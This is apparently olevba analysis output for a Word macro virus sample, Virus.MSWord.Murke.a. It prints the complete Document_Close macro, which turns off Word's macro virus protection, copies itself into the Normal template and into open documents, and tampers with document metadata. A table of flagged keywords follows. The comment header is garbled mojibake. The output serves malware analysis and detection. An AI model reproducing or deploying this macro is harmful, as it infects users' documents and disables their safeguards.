olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.a-23d5f15e65be62ea06d12392a8c9cfa31f066dcc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.a-23d5f15e65be62ea06d12392a8c9cfa31f066dcc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - 毘?焌荏?茵音贓孺?了 蓴嶪 了橓增裝?璥愉樗粧外寮埰裝?溢涯音?
'厥妖打?鴨栯軫?: 행藎槍齧秩� 筍嚴鎭 ?哀有靭粧佃 ?頌適寮暢?
'                 調楫尊增調張杖?裔調蓮牆紅 溢涯音?
'
'圖依淳� 調楫尊增調張杖�: Freeware(樂翟賊狀)
'쿡增迪章軫?             嵌拙焉帙? 調灑診, 壯鴨悅前潗!
'袞哀增城孺:              淃魏 張 壯袍?
'
'"찔?憙? 惟張杷? 軸尊瀑, 狀 � 杖 春孼?張 禎?? 魏?憶?
' 溢悅?穽蘖鎖嚴震?!" - 臣億狀 仲剡予?執. 輕悅?
'콸?MustDie 循?蓴?調仲剡奄!
'袞翟軸怏溢 泣飇 剪愉泓?哀有靭粧 壯 渟猝佺贍茴佃
'惟逸? 宸?槍?埰診狀瞬孼 陝震淳宗卽渾 溢涯蟻 Murka.
'
'잡桎宗:   mustdie@chat.ru
'Murke:    murka@chat.ru
'콧杖依詢: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "쿡有靭粧" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

